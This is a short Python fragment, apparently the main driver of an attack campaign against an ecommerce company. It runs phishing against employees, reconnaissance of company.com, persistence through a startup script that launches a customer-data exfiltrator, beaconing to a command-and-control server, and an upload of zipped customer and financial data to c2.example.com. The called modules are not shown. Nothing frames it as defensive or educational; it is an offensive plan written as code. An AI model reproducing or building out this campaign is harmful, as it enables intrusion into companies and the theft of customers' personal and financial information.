...
def main():
    """
    Main function to run the ecommerce_platform_campaign campaign.
    """
    print(f"[*] Starting ecommerce_platform_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("company_employees.txt")
    run_tool("apt_web_recon.js", "--target company.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/customer_data_and_financial_information_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-COMPANY-01")
    ...
    exfiltration.exfiltrate_data("customer_data_and_financial_information/customer_data_and_financial_information.zip", "https://c2.example.com/upload")
    run_tool("payloads/customer_data_and_financial_information_exfiltrator.py")
